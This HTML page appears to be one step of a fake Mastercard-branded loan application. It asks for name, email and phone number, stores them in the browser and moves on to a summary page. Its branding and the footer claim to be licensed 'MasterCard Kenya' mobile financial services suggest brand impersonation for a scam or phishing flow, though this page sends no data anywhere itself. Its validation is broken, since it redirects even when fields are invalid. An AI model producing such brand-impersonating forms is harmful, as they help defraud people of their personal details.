<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Mastercard | Loan</title>
    <meta name="theme-color" content="#E30613">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:#f8f9fc;color:#1a1a1a;min-height:100vh;display:flex;flex-direction:column;padding:clamp(16px,3vw,24px)}
        header{width:100%;max-width:480px;padding:clamp(16px,4vw,24px);text-align:center;margin:0 auto clamp(16px,4vw,28px);background:white;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.06);position:relative}
        .back-btn{font-size:clamp(28px,7vw,32px);background:none;border:none;cursor:pointer;color:#2c3e50;position:absolute;left:20px;top:50%;transform:translateY(-50%)}
        .logo{font-size:clamp(32px,8vw,40px);font-weight:800;letter-spacing:-1px}
        .logo-m{color:#0c0c0c}.logo-c{color:#fd0808}
        main{flex:1;max-width:480px;width:100%;margin:0 auto}
        .form-card{background:white;border-radius:20px;padding:clamp(28px,6vw,40px) clamp(24px,5vw,32px);box-shadow:0 12px 48px rgba(0,0,0,.08)}
        .form-title{font-size:clamp(24px,6vw,32px);font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:1.5rem}
        .progress-bar{width:100%;height:8px;background:#e9ecef;border-radius:4px;margin:1.5rem auto 1rem;overflow:hidden}
        .progress-fill{width:66.66%;height:100%;background:linear-gradient(90deg,#E30613,#b71c1c);border-radius:4px}
        .step-text{text-align:center;color:#6c757d;font-size:1rem;margin-bottom:2rem}
        .form-group{margin-bottom:1.8rem}
        .form-label{display:block;font-weight:600;color:#2c3e50;margin-bottom:.6rem;font-size:.95rem}
        .form-input{width:100%;padding:1rem 1.2rem;border:1px solid #ced4da;border-radius:10px;font-size:1rem;background:#fdfdfe;transition:all .2s}
        .form-input:focus{border-color:#E30613;outline:none;box-shadow:0 0 0 3px rgba(227,6,19,.15)}
        .invalid{border-color:#dc3545!important;box-shadow:0 0 0 3px rgba(220,53,69,.15)!important}
        .field-error{color:#dc3545;font-size:.875rem;margin-top:.4rem;display:none}
        .name-group{display:flex;gap:1.2rem;margin-bottom:1.8rem}
        .name-group>div{flex:1}
        .phone-wrap{display:flex;align-items:center;border:1px solid #ced4da;border-radius:10px;padding:0 1.2rem}
        .phone-wrap span{color:#6c757d;font-weight:500;margin-right:.8rem}
        .phone-wrap input{flex:1;border:none;outline:none;padding:1rem 0;font-size:1rem;background:transparent}
        .btn-group{display:flex;gap:1rem;margin-top:2.5rem}
        .prev-btn,.next-btn{flex:1;padding:1.15rem;border-radius:12px;font-size:1.15rem;font-weight:700;cursor:pointer;transition:all .2s}
        .prev-btn{background:#e2e8f0;color:#475569;border:none}
        .prev-btn:hover{background:#cbd5e1}
        .next-btn{background:linear-gradient(90deg,#E30613,#b71c1c);color:white;border:none;box-shadow:0 8px 24px rgba(227,6,19,.25)}
        .next-btn:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(227,6,19,.35)}
        footer{padding:clamp(20px,5vw,32px) 20px;color:#adb5bd;font-size:clamp(12px,3vw,14px);text-align:center;margin-top:auto}
        @media(min-width:769px){body{padding:32px}.form-card{padding:2.8rem 3.5rem}}
    </style>
</head>
<body>
    <header>
        <button class="back-btn" onclick="history.back()">←</button>
        <div class="logo"><span class="logo-m">Master</span><span class="logo-c">Card</span></div>
    </header>
    <main>
        <div class="form-card">
            <h1 class="form-title">Personal Details</h1>
            <div class="progress-bar"><div class="progress-fill"></div></div>
            <div class="step-text">Step 2 of 3</div>
            <div class="name-group">
                <div>
                    <label class="form-label">First Name</label>
                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Kwame">
                    <div class="field-error" id="firstNameError">Please enter your first name.</div>
                </div>
                <div>
                    <label class="form-label">Last Name</label>
                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Mensah">
                    <div class="field-error" id="lastNameError">Please enter your last name.</div>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Email Address</label>
                <input type="email" class="form-input" id="email" placeholder="e.g. kwame@example.com">
                <div class="field-error" id="emailError">Please enter a valid email address.</div>
            </div>
            <div class="form-group">
                <label class="form-label">Phone Number</label>
                <div class="phone-wrap" id="phoneGroup">
                    <span>+</span>
                    <input type="tel" id="phone" maxlength="9" placeholder="712345678">
                </div>
                <div class="field-error" id="phoneError">Please enter a valid 9-digit phone number.</div>
            </div>
            <div class="btn-group">
                <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
                <button class="next-btn" id="nextBtn">NEXT STEP</button>
            </div>
        </div>
    </main>
    <footer>© 2026 MasterCard Kenya – Licensed Mobile Financial Services | Powered by Mastercard Cash &amp; MasterCard Play</footer>
    <script>
        ['firstName','lastName','email','phone'].forEach(id=>{
            const v=localStorage.getItem(id);
            if(v) document.getElementById(id).value=v;
        });
        document.getElementById('nextBtn').addEventListener('click',function(){
            const fn=document.getElementById('firstName');
            const ln=document.getElementById('lastName');
            const em=document.getElementById('email');
            const ph=document.getElementById('phone');
            const pg=document.getElementById('phoneGroup');
            document.querySelectorAll('.field-error').forEach(e=>e.style.display='none');
            document.querySelectorAll('.form-input').forEach(e=>e.classList.remove('invalid'));
            pg.classList.remove('invalid');
            let valid=true;
            if(!fn.value.trim()){fn.classList.add('invalid');document.getElementById('firstNameError').style.display='block';valid=false;}
            if(!ln.value.trim()){ln.classList.add('invalid');document.getElementById('lastNameError').style.display='block';valid=false;}
            if(!em.value.trim()||!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em.value)){em.classList.add('invalid');document.getElementById('emailError').style.display='block';valid=false;}
            if(!/^\d{9}$/.test(ph.value.trim())){pg.classList.add('invalid');document.getElementById('phoneError').style.display='block';}
            localStorage.setItem('firstName',fn.value.trim());
            localStorage.setItem('lastName',ln.value.trim());
            localStorage.setItem('email',em.value.trim());
            localStorage.setItem('phone',ph.value.trim());
            window.location.href='summary.html';
        });
        document.querySelectorAll('input').forEach(i=>{
            i.addEventListener('input',()=>i.classList.remove('invalid'));
        });
        document.getElementById('phone').addEventListener('input',()=>{
            document.getElementById('phoneGroup').classList.remove('invalid');
        });
    </script>
</body>
</html>
